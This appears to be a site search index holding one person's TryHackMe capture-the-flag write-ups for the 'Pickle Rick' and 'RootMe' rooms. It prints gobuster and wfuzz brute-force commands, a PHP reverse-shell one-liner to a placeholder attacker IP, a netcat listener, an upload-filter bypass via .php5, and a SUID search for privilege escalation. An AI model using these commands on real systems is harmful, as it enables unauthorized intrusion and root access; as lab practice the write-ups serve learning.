{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Ebomb Tryhackme Writeups This is a place were Ebomb07 puts their writeups of tryhackme rooms, ranging from easy to hard rooms. [easy_rooms: 2] [medium_rooms: 0] [hard_rooms: 0] [insane_rooms: 0]","title":"Ebomb Tryhackme Writeups"},{"location":"#ebomb-tryhackme-writeups","text":"This is a place were Ebomb07 puts their writeups of tryhackme rooms, ranging from easy to hard rooms.","title":"Ebomb Tryhackme Writeups"},{"location":"#easy_rooms-2","text":"","title":"[easy_rooms: 2]"},{"location":"#medium_rooms-0","text":"","title":"[medium_rooms: 0]"},{"location":"#hard_rooms-0","text":"","title":"[hard_rooms: 0]"},{"location":"#insane_rooms-0","text":"","title":"[insane_rooms: 0]"},{"location":"easy/pickle_rick/rick/","text":"RICK WRITEUP [08/28/2024 - 08/29/2024] Time: 2 - 3 hours Optional but useful: When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.108.239; host: rick.thm. Reconnaissance An important step in web enumeration is to get the nmap scan. After seeing port: 80 (http port), we know there is a website involved. We also need to note that port: 22 (ssh port) is also open, which means we can possibly gain root access. After going to the website, we see this We now know our goal, which is to find the last three secret ingredients to change Rick back into a person. Enumeration After digging deeper, you can see in the inspect element the username. Username: R1ckRul3s Very useful information; now we know there has to be some type of login page for this. Knowing that a new page is needed using a fuzzing tool or directory brute forcing tool. The one I used was \"gobsuter.\" Knowing we need to find a different page I used the payload of gobuster dir -u http://rick.thm -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php Got the results of: After looking at the results, one stands out the most. Login.php is most likely the page we are looking for. Another page that wasn't listed was robots.txt (which is used for web scrapping); most websites have it. When looking at it, it only has Wubbalubbadubdub; maybe it has a significance. When using not knowing the password, you can try to brute force the password. Since we already know that the user name is \"R1ckRul3s\" it cuts down on how long it will take to find the password. After running wfuzz -c -z file,apache-user-enum-2.0.txt --hw 61 -d \"username=R1ckRul3s&password=FUZZ\" http://rick.thm/login.php The response was this: Although that random word in Robots.txt might be the password. And bingo, that was the password, and now we are on the portal.php page. So the username and password was R1ckRul3s, Wubbalubbadubdub. After looking around in the different tabs, it looks like we only have access to the commands section. This command panel might be what we need for the first ingredient. When you run 'ls' in the panel, it shows what is in the directory. When trying to read the file, it looks like we can't use the cat command. It is important to note that we are the user www-data. After multiple different commands to read the file, I found that the 'less' command works. Running less Sup3rS3cretPickl3Ingred.txt We get the first ingredient. Now we need to find the next two to help Rick turn back to normal. Looking back on the first directory, there is a text file named clue. Running the less command on the clue.txt says \"Look around the file system for the other ingredient.\". After running pwd, we see that we are in the /var/www/html file path. We are not able to change the directory using cd, which means that we have to traverse the file system via the 'ls' command. After looking, there is a file named \"second ingredients\" when running: ls ../../../home/rick/ Instead of using the command panel, we can run a reverse PHP shell, which allowed access to the www-data user via the command line. Payload: php -r '$sock=fsockopen(\"[MACHINE IP]\",[PORT NUMBER]);exec(\"/bin/sh -i <&3 >&3 2>&3\");' Now we can use all of the commands that this user can do. Which also means that the website had some client-side filiters. When running: cat \"second ingredients\" we get the second ingredient. It is required to have quotations around the second ingredients, since the command line thinks it is two different things. Now on to the third and final ingredient. Most likely, the final ingredient would be in the root directory. When trying to ls the directory, there is an error saying we don't have the permissions. Although we can try the sudo command to get permission. Running: sudo ls -la root we see that 3rd.txt is in the root directory. We now need to run the less command to see the file: sudo less root/3rd.txt . It works! The third and final ingredient was found, and Rick is now back to a normal person. Conclusion At the beginning, using nmap to see the open ports and using gobuster to find the directories. We were able to gain access to the login page. Using the command panel to get the first ingredient, then using a PHP reverse shell to gain access to the machine. Finding the second ingredient in /home/rick/ . Finally, finding the last indgredient in /root/3rd.txt using sudo to gain permission.","title":"RICK WRITEUP"},{"location":"easy/pickle_rick/rick/#rick-writeup","text":"[08/28/2024 - 08/29/2024] Time: 2 - 3 hours","title":"RICK WRITEUP"},{"location":"easy/pickle_rick/rick/#optional-but-useful","text":"When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.108.239; host: rick.thm.","title":"Optional but useful:"},{"location":"easy/pickle_rick/rick/#reconnaissance","text":"An important step in web enumeration is to get the nmap scan. After seeing port: 80 (http port), we know there is a website involved. We also need to note that port: 22 (ssh port) is also open, which means we can possibly gain root access. After going to the website, we see this We now know our goal, which is to find the last three secret ingredients to change Rick back into a person.","title":"Reconnaissance"},{"location":"easy/pickle_rick/rick/#enumeration","text":"After digging deeper, you can see in the inspect element the username. Username: R1ckRul3s Very useful information; now we know there has to be some type of login page for this. Knowing that a new page is needed using a fuzzing tool or directory brute forcing tool. The one I used was \"gobsuter.\" Knowing we need to find a different page I used the payload of gobuster dir -u http://rick.thm -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php Got the results of: After looking at the results, one stands out the most. Login.php is most likely the page we are looking for. Another page that wasn't listed was robots.txt (which is used for web scrapping); most websites have it. When looking at it, it only has Wubbalubbadubdub; maybe it has a significance. When using not knowing the password, you can try to brute force the password. Since we already know that the user name is \"R1ckRul3s\" it cuts down on how long it will take to find the password. After running wfuzz -c -z file,apache-user-enum-2.0.txt --hw 61 -d \"username=R1ckRul3s&password=FUZZ\" http://rick.thm/login.php The response was this: Although that random word in Robots.txt might be the password. And bingo, that was the password, and now we are on the portal.php page. So the username and password was R1ckRul3s, Wubbalubbadubdub. After looking around in the different tabs, it looks like we only have access to the commands section. This command panel might be what we need for the first ingredient. When you run 'ls' in the panel, it shows what is in the directory. When trying to read the file, it looks like we can't use the cat command. It is important to note that we are the user www-data. After multiple different commands to read the file, I found that the 'less' command works. Running less Sup3rS3cretPickl3Ingred.txt We get the first ingredient. Now we need to find the next two to help Rick turn back to normal. Looking back on the first directory, there is a text file named clue. Running the less command on the clue.txt says \"Look around the file system for the other ingredient.\". After running pwd, we see that we are in the /var/www/html file path. We are not able to change the directory using cd, which means that we have to traverse the file system via the 'ls' command. After looking, there is a file named \"second ingredients\" when running: ls ../../../home/rick/ Instead of using the command panel, we can run a reverse PHP shell, which allowed access to the www-data user via the command line. Payload: php -r '$sock=fsockopen(\"[MACHINE IP]\",[PORT NUMBER]);exec(\"/bin/sh -i <&3 >&3 2>&3\");' Now we can use all of the commands that this user can do. Which also means that the website had some client-side filiters. When running: cat \"second ingredients\" we get the second ingredient. It is required to have quotations around the second ingredients, since the command line thinks it is two different things. Now on to the third and final ingredient. Most likely, the final ingredient would be in the root directory. When trying to ls the directory, there is an error saying we don't have the permissions. Although we can try the sudo command to get permission. Running: sudo ls -la root we see that 3rd.txt is in the root directory. We now need to run the less command to see the file: sudo less root/3rd.txt . It works! The third and final ingredient was found, and Rick is now back to a normal person.","title":"Enumeration"},{"location":"easy/pickle_rick/rick/#conclusion","text":"At the beginning, using nmap to see the open ports and using gobuster to find the directories. We were able to gain access to the login page. Using the command panel to get the first ingredient, then using a PHP reverse shell to gain access to the machine. Finding the second ingredient in /home/rick/ . Finally, finding the last indgredient in /root/3rd.txt using sudo to gain permission.","title":"Conclusion"},{"location":"easy/root_me/root_me/","text":"ROOT_ME WRITEUP [9/1/24] Time: 1 hour 10 minutes Optional but useful: When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.126.233; host: root.thm. Recon: Starting this machine, I ran an nmap scan to see the open ports. With the nmap scan, we can see the http port open, and we can run a directory scan. Using the gobuster tool, this is the result. Enumeration When going to the site, we see this: However, we see that there is a /panel directory. It looks like we can upload a file to the site. Which means that we might be able to get a reverse shell onto the server. A good reverse shell is created by pentestmonkey. The reverse shell is created in PHP. Although the most important part of the file is changing the IP and port. Although there is at least one filter on this site not allowing .php files. For some reason it is in Portuguese. However, .php is one of the PHP-type files. Others include: .php5, .php2, .phtml. There are others, but these might work. Perfect, the .php5 extension works, and now the file is in the system. Looking back on the Gobuster scan, we see a /uploads/ directory. When going to that directory, we see the .php5 file. Before clicking the file, make sure that your Netcat is listening to the port. Payload: nc -lvnp [port number] If the netcat worked and the file is going to the right IP and port, it will give you access. When running whoami, you will see that you are www-data . When looking around and going to the /var/www/ directory, you will find user.txt with a flag. For the next challenge, we need to find a weird file with SUID permission. After looking at the man page and different types of payloads, the one found was. find / -type f -user root -perm /4000 2>/dev/null -type f : looking for only files -user : looking for users -perm : with specific permission number 2>/dev/null : sends failed outputs to that file extension. After running that payload, there were a lot fewer results, and we know that we are looking for a / / *** / *** file, and by trying the ones that fit the case, you will find the answer. Now we need to gain root access. However, we don't have access to the sudo command, so we can't look into the root directory. However, there was a hint on the tryhackme room page saying find gtfobins. After looking around, gtfobins looks like it is a type of privilege escalation due to different execution file types, like Python. When running the command below, you will gain root privileges. Then, if you go to /root and cat the file, you will get the final key. Conclusion After running the Gobuster scan, seeing /uploads and /panel allowed us to reverse shell into the system. When going to /var/www, you will find the first flag. Then, when finding files that are given SUID permissions, like the one needed, it allowed for privilege escalation to root and getting the last flag. Reference: -gtfobins: https://gtfobins.github.io/ (privilege escalation) -lightkunyagami: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/ (using 2>/dev/null at the end of the find command)","title":"ROOT_ME WRITEUP"},{"location":"easy/root_me/root_me/#root_me-writeup","text":"[9/1/24] Time: 1 hour 10 minutes","title":"ROOT_ME WRITEUP"},{"location":"easy/root_me/root_me/#optional-but-useful","text":"When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.126.233; host: root.thm.","title":"Optional but useful:"},{"location":"easy/root_me/root_me/#recon","text":"Starting this machine, I ran an nmap scan to see the open ports. With the nmap scan, we can see the http port open, and we can run a directory scan. Using the gobuster tool, this is the result.","title":"Recon:"},{"location":"easy/root_me/root_me/#enumeration","text":"When going to the site, we see this: However, we see that there is a /panel directory. It looks like we can upload a file to the site. Which means that we might be able to get a reverse shell onto the server. A good reverse shell is created by pentestmonkey. The reverse shell is created in PHP. Although the most important part of the file is changing the IP and port. Although there is at least one filter on this site not allowing .php files. For some reason it is in Portuguese. However, .php is one of the PHP-type files. Others include: .php5, .php2, .phtml. There are others, but these might work. Perfect, the .php5 extension works, and now the file is in the system. Looking back on the Gobuster scan, we see a /uploads/ directory. When going to that directory, we see the .php5 file. Before clicking the file, make sure that your Netcat is listening to the port. Payload: nc -lvnp [port number] If the netcat worked and the file is going to the right IP and port, it will give you access. When running whoami, you will see that you are www-data . When looking around and going to the /var/www/ directory, you will find user.txt with a flag. For the next challenge, we need to find a weird file with SUID permission. After looking at the man page and different types of payloads, the one found was. find / -type f -user root -perm /4000 2>/dev/null -type f : looking for only files -user : looking for users -perm : with specific permission number 2>/dev/null : sends failed outputs to that file extension. After running that payload, there were a lot fewer results, and we know that we are looking for a / / *** / *** file, and by trying the ones that fit the case, you will find the answer. Now we need to gain root access. However, we don't have access to the sudo command, so we can't look into the root directory. However, there was a hint on the tryhackme room page saying find gtfobins. After looking around, gtfobins looks like it is a type of privilege escalation due to different execution file types, like Python. When running the command below, you will gain root privileges. Then, if you go to /root and cat the file, you will get the final key.","title":"Enumeration"},{"location":"easy/root_me/root_me/#conclusion","text":"After running the Gobuster scan, seeing /uploads and /panel allowed us to reverse shell into the system. When going to /var/www, you will find the first flag. Then, when finding files that are given SUID permissions, like the one needed, it allowed for privilege escalation to root and getting the last flag.","title":"Conclusion"},{"location":"easy/root_me/root_me/#reference","text":"-gtfobins: https://gtfobins.github.io/ (privilege escalation) -lightkunyagami: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/ (using 2>/dev/null at the end of the find command)","title":"Reference:"}]}